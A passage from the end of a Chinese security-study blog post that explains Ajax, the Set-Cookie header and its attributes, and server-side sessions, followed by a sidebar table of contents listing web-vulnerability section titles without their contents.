<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在传统的 Web 应用程序的工作方式下，客户端和浏览器之间的通信时同步的。比如，当用户在 Web 页面上填写好的表单，提交请求后就会发送到远程服务器上，经过处理之后，服务器再将处理的结果返回，这种行为反复执行，极大的浪费了网络带宽。</p>
<p>Ajax是由 JavaScript 与 CSS、XML、DOM 几种老技术加上 XMLHttpRequest 构成。使用 Ajax 技术后，客户端可以只向服务器传输更新过的内容，借助于客户端的 JavaScript 处理来自服务器的响应。比如，当用户在单击表单按钮时，会使用 JavaScript 和 DHTML 立即更新页面，并向服务器发送异步请求，以执行更新或查询数据库。当请求返回时，就可以只使用 JavaScript 和 CSS 来相应的更新页面，因为客户端和服务端只交互有用的数据，页面显示等不必要的数据便不再重新加载。</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul>
<li>搜索引擎能依照用户输入的关键词，自动列出最多人找到的关键词查询</li>
<li>注册模块中，用户填写完用户名后，系统会实时验证该用户名是否被注册</li>
</ul>
<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="Cookie-简介"><a href="#Cookie-简介" class="headerlink" title="Cookie 简介"></a>Cookie 简介</h2><p>Cookie 是一种让网站服务器能把少量文本数据存到客户端硬盘、内存，或者是从客户端的硬盘、内存读取数据的一种技术。</p>
<p>因为 HTTP 协议是无状态的，Web 服务器无法区分一个请求是否来自同一个浏览器。所以，Web 服务器需要额外的数据用于维护会话。Cookie 正式一段随 HTTP 请求、响应一起被传递的额外数据，它的作用就是<strong>标识用户、维持会话</strong>。</p>
<p>当你访问某个网站时，该网站可能向你的电脑写入一个非常小的文本文件，他可以记录你用户的 ID、密码、停留的时间等信息，这个文件就是 Cookie 文件。当你再次访问这个网站时，浏览器会自动检测你的硬盘，并将存储在本地的 Cookie 发送给网站，网站通过读取 Cookie，得到你的相关信息，就可以做出相应的动作。</p>
<p>Cookie 按照在硬盘中存储的位置，可以分为<strong>内存 Cookie</strong> 和 <strong>硬盘 Cookie</strong>。内存 Cookie 由浏览器维护，保存在内存中，浏览器关闭后就消失，其存在时间是短暂的。硬盘 Cookie 保存在硬盘中，有一个过期时间，除非用户手动清理，或者到了过期时间，否则硬盘 Cookie 是不会被删除的，其存在时间是长期的。所以，Cookie 也可以分为<strong>持久 Cookie</strong> 和<strong>非持久 Cookie</strong>。</p>
<p>一个用户电脑里也可以有多个 Cookie 存在，分别保存不同网站的存储信息，但是一个网站只能存取自己的 Cookie 信息，无法读取电脑上的其他 Cookie 信息。</p>
<h2 id="Cookie-格式"><a href="#Cookie-格式" class="headerlink" title="Cookie 格式"></a>Cookie 格式</h2><p>每个 Cookie 文件都是一个 TXT 文件，都以 “<strong>用户名@网站 URL</strong>“ 来命名。</p>
<p>Cookie 部分格式如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: <span class="tag">&lt;<span class="name">name</span>&gt;</span>=<span class="tag">&lt;<span class="name">value</span>&gt;</span>[;<span class="tag">&lt;<span class="name">Max-Age</span>&gt;</span>=<span class="tag">&lt;<span class="name">age</span>&gt;</span>][;expires=<span class="tag">&lt;<span class="name">date</span>&gt;</span>][;domain=<span class="tag">&lt;<span class="name">domain_name</span>&gt;</span>][;path=<span class="tag">&lt;<span class="name">some_path</span>&gt;</span>][;secure][;HttpOnly]</span><br></pre></td></tr></table></figure>

<ul>
<li>Set-Cookie : HTTP 响应头，Web 服务器通过此 HTTP 头向客户端发送 Cookie</li>
<li>name=value : 每一个 Cookie 必须含有的部分。用户可以根据 name 取出存在 Cookie 中的 value。name=value 中不含有分号、逗号、空格。</li>
<li>expirse=date : Expires 确定了 Cookie 的有效终止日期。该变量是可选的，如果缺省，则 Cookie 的值不会保存在硬盘中，而仅仅保存在内存中。</li>
<li>domain=domain_name : Domain 变量确定了哪些 Internet 域中的服务器可以读取浏览器的存储的 Cookie。该设置是可选的，如果缺省，值为该 Web 服务器的域名。</li>
<li>path=path : 定义了 Web 服务器上哪些路径下的页面可以获取服务器发送的 Cookie。该设置是可选的，如果缺省，值为该 Web 服务器传给浏览器的资源路径名。</li>
<li>secure : 如果在 Cookie 中标记该变量，表明和服务器之间的通信协议为加密认证协议时，才会发送 Cookie，目前只有 HTTPS。</li>
<li>HttpOnly : 禁止 Javascript 读取 Cookie。</li>
</ul>
<h1 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h1><p>除了 Cookie 之外，SESSION 是另外一种维持会话访问状态的机制。只不过 SESSION 是服务端的机制，SESSION 与 Cookie 的区别就是，SESSION 保存在服务端，Cookie 保存在客户端。</p>
<p>Web 中的 SESSION 是指从打开一个网站到关闭浏览器的过程，也就是客户端与服务端一次”对话”，被称为 SESSION，当浏览器关闭时，SESSION 也自动注销。</p>
<p>每个用户的会话状态都是不同的 SESSION，管理员登陆网站时，这是一个 SESSION，普通用户登陆网站时，这又是一个 SESSION。而服务器依靠 SESSIONID 来区分不同的 SESSION。</p>
<p>当用户第一次连接到服务器时，会分配一个 SESSIONID，这个 SESSIONID 是唯一的，且不会重复，当服务器或浏览器关闭时，SESSION 将自动注销，用户重新连接时会重新分配。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/总结/" rel="tag"><i class="fa fa-tag"></i> 总结</a>
          
            <a href="/tags/漏洞/" rel="tag"><i class="fa fa-tag"></i> 漏洞</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/06/10/SQL注入总结/" rel="next" title="SQL 注入">
                <i class="fa fa-chevron-left"></i> SQL 注入
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/06/19/源码泄露/" rel="prev" title="常见源码泄露">
                常见源码泄露 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/toux.jpg" alt="peri0d">
            
              <p class="site-author-name" itemprop="name">peri0d</p>
              <p class="site-description motion-element" itemprop="description">待我尝尽世间甘苦，便喂你一勺甜。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">15</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://buuoj.cn" title="BUUCTF" target="_blank">BUUCTF</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://adworld.xctf.org.cn/" title="攻防世界" target="_blank">攻防世界</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HTML-Injection-Reflected-GET"><span class="nav-number">1.</span> <span class="nav-text">HTML Injection - Reflected (GET)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因"><span class="nav-number">1.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式"><span class="nav-number">1.2.</span> <span class="nav-text">利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#窃取-Cookies"><span class="nav-number">1.2.1.</span> <span class="nav-text">窃取 Cookies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#钓鱼"><span class="nav-number">1.2.2.</span> <span class="nav-text">钓鱼</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式"><span class="nav-number">1.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTML-Injection-Reflected-POST"><span class="nav-number">2.</span> <span class="nav-text">HTML Injection - Reflected (POST)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-1"><span class="nav-number">2.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-1"><span class="nav-number">2.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-1"><span class="nav-number">2.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTML-Injection-Reflected-Current-URL"><span class="nav-number">3.</span> <span class="nav-text">HTML Injection - Reflected (Current URL)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-2"><span class="nav-number">3.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-2"><span class="nav-number">3.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-2"><span class="nav-number">3.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTML-Injection-Stored-Blog"><span class="nav-number">4.</span> <span class="nav-text">HTML Injection - Stored (Blog)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-3"><span class="nav-number">4.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-3"><span class="nav-number">4.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-3"><span class="nav-number">4.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#iFrame-Injection"><span class="nav-number">5.</span> <span class="nav-text">iFrame Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-4"><span class="nav-number">5.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-4"><span class="nav-number">5.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-4"><span class="nav-number">5.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LDAP-Injection-Search"><span class="nav-number">6.</span> <span class="nav-text">LDAP Injection (Search)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#补充知识"><span class="nav-number">6.1.</span> <span class="nav-text">补充知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-5"><span class="nav-number">6.2.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-5"><span class="nav-number">6.3.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-5"><span class="nav-number">6.4.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mail-Header-Injection-SMTP"><span class="nav-number">7.</span> <span class="nav-text">Mail Header Injection (SMTP)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#OS-Command-Injection"><span class="nav-number">8.</span> <span class="nav-text">OS Command Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-6"><span class="nav-number">8.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-6"><span class="nav-number">8.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-6"><span class="nav-number">8.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-Code-Injection"><span class="nav-number">9.</span> <span class="nav-text">PHP Code Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-7"><span class="nav-number">9.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-7"><span class="nav-number">9.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-7"><span class="nav-number">9.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Server-Side-Includes-SSI-Injection"><span class="nav-number">10.</span> <span class="nav-text">Server-Side Includes (SSI) Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#补充知识-1"><span class="nav-number">10.1.</span> <span class="nav-text">补充知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-8"><span class="nav-number">10.2.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-8"><span class="nav-number">10.3.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-8"><span class="nav-number">10.4.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-GET-Search"><span class="nav-number">11.</span> <span class="nav-text">SQL Injection (GET/Search)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-9"><span class="nav-number">11.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-9"><span class="nav-number">11.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-9"><span class="nav-number">11.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-GET-Select"><span class="nav-number">12.</span> <span class="nav-text">SQL Injection (GET/Select)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-10"><span class="nav-number">12.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-10"><span class="nav-number">12.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-10"><span class="nav-number">12.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-POST-Search"><span class="nav-number">13.</span> <span class="nav-text">SQL Injection (POST/Search)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-11"><span class="nav-number">13.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-11"><span class="nav-number">13.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-11"><span class="nav-number">13.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-POST-Select"><span class="nav-number">14.</span> <span class="nav-text">SQL Injection (POST/Select)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-12"><span class="nav-number">14.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-12"><span class="nav-number">14.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-12"><span class="nav-number">14.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-AJAX-JSON-jQuery"><span class="nav-number">15.</span> <span class="nav-text">SQL Injection (AJAX/JSON/jQuery)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-13"><span class="nav-number">15.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-13"><span class="nav-number">15.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-13"><span class="nav-number">15.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-CAPTCHA"><span class="nav-number">16.</span> <span class="nav-text">SQL Injection (CAPTCHA)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-14"><span class="nav-number">16.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-14"><span class="nav-number">16.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-14"><span class="nav-number">16.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Login-Form-Hero"><span class="nav-number">17.</span> <span class="nav-text">SQL Injection (Login Form/Hero)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-15"><span class="nav-number">17.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-15"><span class="nav-number">17.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-15"><span class="nav-number">17.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Login-Form-User"><span class="nav-number">18.</span> <span class="nav-text">SQL Injection (Login Form/User)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-16"><span class="nav-number">18.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-16"><span class="nav-number">18.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-16"><span class="nav-number">18.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-SQLite"><span class="nav-number">19.</span> <span class="nav-text">SQL Injection (SQLite)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-17"><span class="nav-number">19.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-17"><span class="nav-number">19.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-17"><span class="nav-number">19.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Drupal"><span class="nav-number">20.</span> <span class="nav-text">SQL Injection (Drupal)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-18"><span class="nav-number">20.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-18"><span class="nav-number">20.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-18"><span class="nav-number">20.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Stored-Blog"><span class="nav-number">21.</span> <span class="nav-text">SQL Injection - Stored (Blog)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-19"><span class="nav-number">21.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-19"><span class="nav-number">21.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-19"><span class="nav-number">21.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Stored-SQLite"><span class="nav-number">22.</span> <span class="nav-text">SQL Injection - Stored (SQLite)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-20"><span class="nav-number">22.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-20"><span class="nav-number">22.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-20"><span class="nav-number">22.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Stored-User-Agent"><span class="nav-number">23.</span> <span class="nav-text">SQL Injection - Stored (User-Agent)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-21"><span class="nav-number">23.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-21"><span class="nav-number">23.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-21"><span class="nav-number">23.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Stored-XML"><span class="nav-number">24.</span> <span class="nav-text">SQL Injection - Stored (XML)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-22"><span class="nav-number">24.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-22"><span class="nav-number">24.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-22"><span class="nav-number">24.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Blind-Boolean-Based"><span class="nav-number">25.</span> <span class="nav-text">SQL Injection - Blind - Boolean-Based</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-23"><span class="nav-number">25.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-23"><span class="nav-number">25.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-23"><span class="nav-number">25.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Blind-Time-Based"><span class="nav-number">26.</span> <span class="nav-text">SQL Injection - Blind - Time-Based</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-24"><span class="nav-number">26.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-24"><span class="nav-number">26.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-24"><span class="nav-number">26.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Blind-SQLite"><span class="nav-number">27.</span> <span class="nav-text">SQL Injection - Blind (SQLite)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-25"><span class="nav-number">27.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-25"><span class="nav-number">27.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-25"><span class="nav-number">27.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection-Blind-Web-Services-SOAP"><span class="nav-number">28.</span> <span class="nav-text">SQL Injection - Blind (Web Services/SOAP)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-26"><span class="nav-number">28.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-26"><span class="nav-number">28.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-26"><span class="nav-number">28.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML-XPath-Injection-Login-Form"><span class="nav-number">29.</span> <span class="nav-text">XML/XPath Injection (Login Form)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-27"><span class="nav-number">29.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-27"><span class="nav-number">29.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-27"><span class="nav-number">29.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML-XPath-Injection-Search"><span class="nav-number">30.</span> <span class="nav-text">XML/XPath Injection (Search)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因-28"><span class="nav-number">30.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式-28"><span class="nav-number">30.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护方式-28"><span class="nav-number">30.3.</span> <span class="nav-text">防护方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE"><span class="nav-number">31.</span> <span class="nav-text">XXE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">32.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF-简介"><span class="nav-number">32.1.</span> <span class="nav-text">SSRF 简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#概念"><span class="nav-number">32.1.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-原理"><span class="nav-number">32.1.2.</span> <span class="nav-text">SSRF 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-用途"><span class="nav-number">32.1.3.</span> <span class="nav-text">SSRF 用途</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ajax"><span class="nav-number">33.</span> <span class="nav-text">Ajax</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">33.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#应用场景"><span class="nav-number">33.2.</span> <span class="nav-text">应用场景</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cookie"><span class="nav-number">34.</span> <span class="nav-text">Cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookie-简介"><span class="nav-number">34.1.</span> <span class="nav-text">Cookie 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookie-格式"><span class="nav-number">34.2.</span> <span class="nav-text">Cookie 格式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SESSION"><span class="nav-number">35.</span> <span class="nav-text">SESSION</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">peri0d</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
